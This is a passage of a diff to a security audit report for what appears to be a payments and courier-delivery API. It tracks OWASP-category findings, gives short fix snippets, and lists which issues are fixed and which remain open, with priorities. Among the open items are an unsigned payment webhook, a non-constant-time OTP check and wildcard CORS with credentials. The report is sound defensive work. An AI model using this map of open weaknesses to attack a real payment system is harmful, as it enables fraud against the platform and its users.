-**Fix:** Cache verified Basic-auth credentials (keyed by hashed `Authorization` header) with a short TTL (60s) in an in-memory dict or Redis.
-
----
-
-### [LOW] `is_verified` claim in JWT can become stale — admin revocation has a delay
-**File:** `src/utils/auth/auth.py:70`
-
+**Fix:**
 ```python
-"is_verified": user.is_verified,
+from pydantic import Field
+access_token_expire_minutes: int = Field(default=15, ge=5, le=1440)
 ```
-
-If an admin revokes a user's verified status, their existing access token continues to claim `is_verified=True` until expiry (up to `ACCESS_TOKEN_EXPIRE_MINUTES`). For a financial platform this window should be documented as acceptable risk.
-
-**Fix:** Re-check `is_verified` from DB in `get_current_user` for sensitive endpoints, or reduce token lifetime.
 
 ---
 
-### [LOW] Pydantic V1-style validators in schemas — deprecation warnings, breaks in Pydantic V3
-**Files:** `src/schemas/shared/__init__.py`, `src/schemas/admin/__init__.py`
+### A08: Software and Data Integrity Failures
 
+#### ✅ Payment double-credit prevented — FIXED
+Atomic `UPDATE WHERE status=PENDING` with `rowcount` guard.
+
+#### ✅ Order claim race condition prevented — FIXED
+Atomic `UPDATE WHERE status=NEW` with `rowcount` guard.
+
+#### ✅ Chat media magic-byte validation — FIXED
+Images: JPEG (`\xff\xd8\xff`) and PNG (`\x89PNG\r\n\x1a\n`) validated. Videos: box-type check (`ftyp`, `mdat`, etc.) + MP4 duration parser validates max 30 seconds.
+
+---
+
+### A09: Security Logging and Monitoring Failures
+
+#### [MEDIUM] No audit log for sensitive admin actions — **OPEN**
+Actions like courier approval, wallet credits, and invoice creation lack structured audit records. If a wallet is credited fraudulently, there is no immutable log trail.
+
+**Fix:** Create an `AuditLog` model and write entries for: courier approval/rejection, admin wallet credits, invoice creation/modification, order cancellation.
+
+#### [MEDIUM] Payment webhook not logged with source IP — **OPEN**
+**File:** `src/routers/payments.py`
+
+Successful and failed webhook deliveries are not logged with IP, timestamp, and payload hash. This makes forensic analysis after fraud impossible.
+
+**Fix:**
 ```python
-@validator("phone_number")   # V1 — deprecated
-class Config: ...            # V1 — deprecated
+logging.info(
+    "paylink_callback received",
+    extra={"transaction_no": transaction_no, "status": paylink_status,
+           "client_ip": request.client.host if request.client else "unknown"}
+)
 ```
 
-These produce deprecation warnings on every request in current Pydantic V2. Will raise errors in Pydantic V3.
+#### [LOW] No alerting on repeated failed OTP attempts — **OPEN**
+Failed OTP verifications are not logged at WARNING level or forwarded to an alerting system. A brute-force attempt against a specific phone number is invisible.
 
-**Fix:** Migrate to `@field_validator` and `model_config = ConfigDict(...)`.
+**Fix:** `logging.warning("OTP verification failed for %s", normalized_phone)` with integration into your monitoring system.
+
+---
+
+### A10: Server-Side Request Forgery (SSRF)
+
+#### ✅ Paylink client uses hardcoded base URL — Not vulnerable
+`BASE_URL = "https://api.paylink.sa"` is hardcoded in `src/utils/clients/paylink.py`. Users cannot influence the target URL.
+
+#### ✅ Storage client uses configured endpoint — Not vulnerable
+boto3 uses `settings.storage_endpoint_url`; the value comes from env, not user input.
+
+#### ✅ Media URLs stored, not fetched — Not vulnerable
+`media_url` returned by `upload_media()` is stored in DB. The API never fetches URLs supplied by users.
 
 ---
 
 ## Summary Table
 
-| # | Severity | Category | Issue | File(s) |
+| # | Severity | Status | Issue | File(s) |
 |---|---|---|---|---|
-| 1 | **CRITICAL** | Auth | Unauthenticated `complete-profile` — account takeover | `auth.py:348` |
-| 2 | **CRITICAL** | IDOR | No ownership check on `GET /invoices/{id}` | `invoices.py:183` |
-| 3 | **CRITICAL** | Race Condition | Double-spend in payment callback (TOCTOU) | `payments.py:236` |
-| 4 | **HIGH** | Authorization | No role check on `assign_order` | `orders.py:332` |
-| 5 | **HIGH** | XSS | SVG upload allows stored XSS | `orders.py:87` |
-| 6 | **HIGH** | XSS | Stored XSS in WebSocket chat messages | `main.py:330` |
-| 7 | **HIGH** | Race Condition | `accept_order` has no `SELECT FOR UPDATE` | `orders.py:442` |
-| 8 | **HIGH** | Business Logic | `cancel_order` leaves active payment → override | `orders.py:316` |
-| 9 | **HIGH** | File Handling | Predictable PDF temp filenames | `invoices.py:382` |
-| 10 | **HIGH** | Rate Limiting | In-memory rate limit bypassed in multi-worker | `auth.py:34` |
-| 11 | **HIGH** | Config | `dev/otp` endpoint always registered | `auth.py:503` |
-| 12 | **HIGH** | Transport | Admin Basic auth vulnerable if HTTP path exists | `main.py:147` |
-| 13 | **MEDIUM** | Input Validation | No max amount on wallet charge | `wallets.py:46` |
-| 14 | **MEDIUM** | Input Validation | No max amount on admin wallet charge | `admin.py:115` |
-| 15 | **MEDIUM** | Business Logic | `CourierBalanceAddition` skipped (enum vs string) | `orders.py:716` |
-| 16 | **MEDIUM** | Business Logic | Courier `balance_before` wrong under concurrency | `orders.py:694` |
-| 17 | **MEDIUM** | XSS | Exception details exposed in 502 responses | `payments.py:168` |
-| 18 | **MEDIUM** | Injection | Untrusted invoice fields in WebSocket messages | `main.py:363` |
-| 19 | **MEDIUM** | Rate Limiting | OTP rate limit on un-normalized phone | `auth.py:107` |
-| 20 | **MEDIUM** | DoS | Unbounded `push_token` length | `auth.py:459` |
-| 21 | **MEDIUM** | Admin DoS | bcrypt on every admin static asset | `main.py:133` |
-| 22 | **MEDIUM** | PII | User name/ID in `order.comments` plaintext | `orders.py:327` |
-| 23 | **LOW** | Rate Limiting | No rate limit on `/paylink-callback` | `payments.py:189` |
-| 24 | **LOW** | Info Disclosure | `is_verified` in JWT can be stale | `auth.py:70` |
-| 25 | **LOW** | Info Disclosure | Payment gateway `str(e)` in 502 detail | `payments.py:168` |
-| 26 | **LOW** | Compliance | Pydantic V1 validators — deprecation | `schemas/**` |
+| 1 | **CRITICAL** | ✅ Fixed | Unauthenticated `complete-profile` | `auth.py` |
+| 2 | **CRITICAL** | ✅ Fixed | IDOR on `GET /invoices/{id}` | `invoices.py` |
+| 3 | **CRITICAL** | ✅ Fixed | Double-spend in payment callback | `payments.py` |
+| 4 | **CRITICAL** | 🔴 Open | No webhook signature on Paylink callback | `payments.py` |
+| 5 | **HIGH** | ✅ Fixed | No role check on `assign_order` | `orders.py` |
+| 6 | **HIGH** | ✅ Fixed | SVG upload XSS in order images | `orders.py` |
+| 7 | **HIGH** | ✅ Fixed | SVG upload XSS in chat images | `chat.py` |
+| 8 | **HIGH** | ✅ Fixed | Stored XSS in WebSocket chat | `main.py` |
+| 9 | **HIGH** | ✅ Fixed | `accept_order` race condition | `orders.py` |
+| 10 | **HIGH** | ✅ Fixed | `cancel_order` payment not invalidated | `orders.py` |
+| 11 | **HIGH** | ✅ Fixed | Predictable PDF temp files | `invoices.py` |
+| 12 | **HIGH** | 🟡 Partial | In-memory rate limit (multi-worker) | `auth.py` |
+| 13 | **HIGH** | ✅ Fixed | `dev/otp` always registered | `auth.py` |
+| 14 | **HIGH** | 🔴 Open (mitigated) | Admin Basic auth over HTTP | `main.py` |
+| 15 | **HIGH** | 🔴 Open | Non-constant-time OTP comparison | `auth.py` |
+| 16 | **MEDIUM** | ✅ Fixed | No max amount on wallet charge | `wallets.py` |
+| 17 | **MEDIUM** | ✅ Fixed | No max amount on admin wallet charge | `admin.py` |
+| 18 | **MEDIUM** | ✅ Fixed | `CourierBalanceAddition` skipped (enum) | `orders.py` |
+| 19 | **MEDIUM** | ✅ Fixed | `balance_before` wrong under concurrency | `orders.py` |
+| 20 | **MEDIUM** | ✅ Fixed | Exception details in 502 responses | `payments.py`, `wallets.py`, `chat.py` |
+| 21 | **MEDIUM** | ✅ Fixed | Untrusted invoice fields in WebSocket | `main.py` |
+| 22 | **MEDIUM** | ✅ Fixed | Untrusted invoice amounts / system msgs in REST | `chat.py` |
+| 23 | **MEDIUM** | ✅ Fixed | OTP rate limit on un-normalized phone | `auth.py` |
+| 24 | **MEDIUM** | ✅ Fixed | Unbounded `push_token` length | `auth.py` |
+| 25 | **MEDIUM** | ✅ Fixed | bcrypt DoS on every admin static asset | `main.py` |
+| 26 | **MEDIUM** | ✅ Partial | PII in `order.comments` (name removed) | `orders.py` |
+| 27 | **MEDIUM** | 🔴 Open | CORS defaults to wildcard with credentials | `main.py`, `config.py` |
+| 28 | **MEDIUM** | 🔴 Open | Courier locked out of invoice by DB ID | `invoices.py` |
+| 29 | **MEDIUM** | 🔴 Open | No audit log for sensitive admin actions | all routers |
+| 30 | **MEDIUM** | 🔴 Open | Webhook not logged with source IP/payload | `payments.py` |
+| 31 | **LOW** | ✅ Fixed | Payment gateway `str(e)` in 502 | `payments.py` |
+| 32 | **LOW** | 🔴 Open | No rate limit on `/paylink-callback` | `payments.py` |
+| 33 | **LOW** | 🔴 Open | `is_verified` in JWT can be stale | `auth.py` |
+| 34 | **LOW** | ✅ Fixed | Pydantic V1 validators — deprecation | `schemas/**` |
+| 35 | **LOW** | ✅ Fixed | No HTML escape in REST chat messages | `chat.py` |
+| 36 | **LOW** | ✅ Fixed | Any user can post `system` messages | `chat.py` |
+| 37 | **LOW** | ✅ Fixed | No max content length in REST chat | `chat.py` |
+| 38 | **LOW** | 🔴 Open | CSP includes `'unsafe-inline'` | `main.py` |
+| 39 | **LOW** | 🔴 Open | No automated dependency scanning | CI config |
+| 40 | **LOW** | 🔴 Open | `declarative_base()` deprecated (SQLAlchemy 2.0) | `database.py` |
+| 41 | **LOW** | 🔴 Open | No upper bound on `ACCESS_TOKEN_EXPIRE_MINUTES` | `config.py` |
+| 42 | **LOW** | 🔴 Open | No alerting on repeated failed OTP attempts | `auth.py` |
+| 43 | **LOW** | 🔴 Open | No rate limit on public enumeration endpoints | `cities.py`, `couriers.py` |
 
 ---
 
 ## No Vulnerabilities Found In
 
-- **SQL Injection:** All queries use SQLAlchemy ORM with parameterized bindings. No raw `text()` with user input.
-- **Command Injection:** No `os.system`, `subprocess`, or `eval()` usage anywhere.
-- **Path Traversal:** File paths are constructed from controlled values (`tempfile.gettempdir()` + server-generated names); no user-controlled path segments.
-- **SSRF:** External HTTP calls are only to Paylink (`api.paylink.sa`) and configured SMTP/email providers — URLs are not user-controlled.
-- **Insecure Deserialization:** No `pickle`, `yaml.load`, or similar dangerous deserializers.
-- **CSRF:** Not applicable — API uses JWT Bearer tokens in the `Authorization` header, not cookies. Browsers do not auto-send Bearer tokens in cross-origin requests.
-- **Secrets in code:** No hardcoded secrets found; all credentials loaded from `Settings` (pydantic-settings env file).
+- **SQL Injection:** All queries use SQLAlchemy ORM with parameterized bindings.
+- **Command Injection:** No `os.system`, `subprocess`, or `eval()` usage.
+- **Path Traversal:** File paths constructed from controlled values.
+- **SSRF:** External HTTP calls only to Paylink and configured SMTP — URLs not user-controlled.
+- **Insecure Deserialization:** No `pickle`, `yaml.load`, or similar.
+- **CSRF:** Not applicable — API uses JWT Bearer tokens in `Authorization` header, not cookies.
+- **Secrets in code:** No hardcoded secrets; all credentials loaded from `Settings`.
+- **JWT algorithm confusion:** `algorithms=["HS256"]` pinned in all `jwt.decode()` calls.
 
 ---
 
-## Immediate Action Priority
+## Open Items Priority
 
-1. **CRITICAL #1** — Add auth to `complete-profile` before any user registers
-2. **CRITICAL #2** — Add ownership check to `GET /invoices/{invoice_id}`
-3. **CRITICAL #3** — Make payment status update atomic (`UPDATE … WHERE status=PENDING`)
-4. **HIGH #4** — Add role guard to `assign_order`
-5. **HIGH #5** — Remove SVG from allowed upload types
-6. **HIGH #6** — HTML-escape WebSocket chat content server-side
-7. **HIGH #7** — Add `SELECT FOR UPDATE` to `accept_order`
-8. **HIGH #11** — Register `dev/otp` route only when `settings.debug` is True
+1. **CRITICAL #4** — Add Paylink webhook signature verification or re-validate with Paylink API
+2. **HIGH #15** — Use `secrets.compare_digest()` for OTP comparison
+3. **HIGH #12** — Migrate OTP rate limiting to Redis for multi-worker correctness
+4. **MEDIUM #27** — Set explicit `ALLOWED_ORIGINS` in production; reject wildcard with credentials
+5. **MEDIUM #28** — Fix courier access to invoice by DB ID endpoint
+6. **MEDIUM #29** — Add audit logging for courier approval, wallet credits, invoice changes
+7. **MEDIUM #30** — Log webhook source IP and payload hash
+8. **LOW #38** — Remove `'unsafe-inline'` from CSP; use nonces
+9. **LOW #39** — Add `pip-audit` to CI
+10. **LOW #40** — Fix `declarative_base()` import to `sqlalchemy.orm`
